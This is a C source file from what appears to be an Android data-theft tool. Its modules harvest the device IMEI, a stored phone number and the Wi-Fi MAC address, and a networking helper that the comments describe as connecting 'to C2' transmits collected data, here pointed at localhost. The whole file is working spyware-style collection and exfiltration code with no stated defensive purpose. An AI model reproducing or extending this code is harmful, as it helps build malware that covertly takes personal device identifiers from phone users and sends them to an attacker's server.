/**
 * @file modules.c
 * @brief Business logic for extraction and networking modules.
 */

#include "modules.h"
#include "ipc.h"
#include "symbol_resolver.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>

// --- Static Helpers ---

/**
 * @brief Safely read the first line of a file.
 */
static int read_file_line(const char* path, char* buffer, size_t size) {
    FILE* f = fopen(path, "r");
    if (!f) return 0;
    
    if (fgets(buffer, (int)size, f) != NULL) {
        buffer[strcspn(buffer, "\n")] = 0; // Trim newline
        fclose(f);
        return 1;
    }
    fclose(f);
    return 0;
}

/**
 * @brief Write all data to a stream socket, handling EINTR.
 */
static ssize_t write_all(int fd, const void* buf, size_t count) {
    size_t written = 0;
    const char* ptr = buf;
    while (written < count) {
        ssize_t n = write(fd, ptr + written, count - written);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;
            return -1;
        }
        written += n;
    }
    return written;
}

/**
 * @brief Centralized networking logic for Logger and Sender modules.
 * Connects to C2, sends data, and optionally waits for ACK.
 */
static void perform_network_transmission(const char* data, int wait_for_ack) {
    if (!data) return;

    // CRITICAL: Ignore SIGPIPE. If server closes connection, do not crash child.
    signal(SIGPIPE, SIG_IGN);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);
    
    // Use localhost for this implementation
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
        close(sock);
        return;
    }

    // Connect with blocking call
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(sock);
        return;
    }

    // Transmit Payload
    write_all(sock, data, strlen(data));

    // Optional ACK Logic
    if (wait_for_ack) {
        char ack[16];
        // Set a receive timeout to prevent hanging forever
        struct timeval tv = {2, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        
        // Read ACK (We don't process the content in this version)
        read(sock, ack, sizeof(ack)); 
    }

    close(sock);
}

// --- Registry ---

module_entry_fn get_module_entry(int module_id) {
    switch (module_id) {
        case MOD_ID_IMEI:   return mod_imei_entry;
        case MOD_ID_PHONE:  return mod_phone_entry;
        case MOD_ID_MAC:    return mod_mac_entry;
        case MOD_ID_LOGGER: return mod_logger_entry;
        case MOD_ID_SENDER: return mod_sender_entry;
        default: return NULL;
    }
}

// --- Implementations ---

void mod_imei_entry(int socket_fd, const char* input_arg) {
    (void)input_arg;
    IpcResponse resp;
    ipc_init_response(&resp);

    char prop_val[256] = {0};
    // Try primary property
    int len = sal_get_property("ro.id.imei", prop_val);
    
    // Try fallback property
    if (len <= 0) len = sal_get_property("ro.ril.oem.imei", prop_val);

    if (len > 0) ipc_set_data(&resp, prop_val);
    else ipc_set_error(&resp, 1, "N/A");

    ipc_send_packet(socket_fd, &resp);
}

void mod_phone_entry(int socket_fd, const char* input_arg) {
    (void)input_arg;
    IpcResponse resp;
    ipc_init_response(&resp);

    const char* target_file = "/data/local/tmp/prefs.xml"; 
    char buffer[512];
    
    // Simple naive XML search
    if (read_file_line(target_file, buffer, sizeof(buffer))) {
        char* found = strstr(buffer, "number=\"");
        if (found) {
            found += 8; 
            char* end = strchr(found, '"');
            if (end) {
                *end = '\0';
                ipc_set_data(&resp, found);
                ipc_send_packet(socket_fd, &resp);
                return;
            }
        }
    }
    ipc_set_error(&resp, 1, "N/A");
    ipc_send_packet(socket_fd, &resp);
}

void mod_mac_entry(int socket_fd, const char* input_arg) {
    (void)input_arg;
    IpcResponse resp;
    ipc_init_response(&resp);

    char mac[128];
    if (read_file_line("/sys/class/net/wlan0/address", mac, sizeof(mac))) {
        ipc_set_data(&resp, mac);
    } else {
        ipc_set_error(&resp, 1, "N/A");
    }
    ipc_send_packet(socket_fd, &resp);
}

void mod_logger_entry(int socket_fd, const char* input_arg) {
    (void)socket_fd; // Not used
    if (!input_arg) return;
    
    char log_msg[512];
    snprintf(log_msg, sizeof(log_msg), "LOG: %s\n", input_arg);
    
    perform_network_transmission(log_msg, 0); // No ACK
}

void mod_sender_entry(int socket_fd, const char* input_arg) {
    (void)socket_fd; // Not used
    perform_network_transmission(input_arg, 1); // Wait for ACK
}


